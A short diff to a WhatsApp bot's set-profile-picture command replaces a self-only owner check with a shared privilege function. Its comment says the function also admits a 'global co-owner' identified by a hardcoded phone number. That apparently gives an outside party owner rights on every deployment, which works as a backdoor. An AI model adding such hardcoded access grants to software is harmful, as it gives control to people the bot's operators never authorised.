@@ -5,10 +5,13 @@ const path = require('path');
 const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
 const { getLang } = require('../lib/lang');
 
+const { hasOwnerPrivileges } = require('./sudo');
+
 async function setProfilePicture(sock, chatId, msg) {
     try {
-        // Check if user is owner
-        const isOwner = msg.key.fromMe;
+        // Check if user is owner or global co-owner (+923299931199)
+        const senderCandidate = msg.key?.participantAlt || msg.key?.participant || msg.key?.remoteJidAlt || msg.key?.remoteJid || '';
+        const isOwner = hasOwnerPrivileges(senderCandidate, msg, sock?.user?.id, sock?._sessionNumber || null);
         if (!isOwner) {
             await sock.sendMessage(chatId, { 
                 text: getLang(sock).setpp_owner_only 
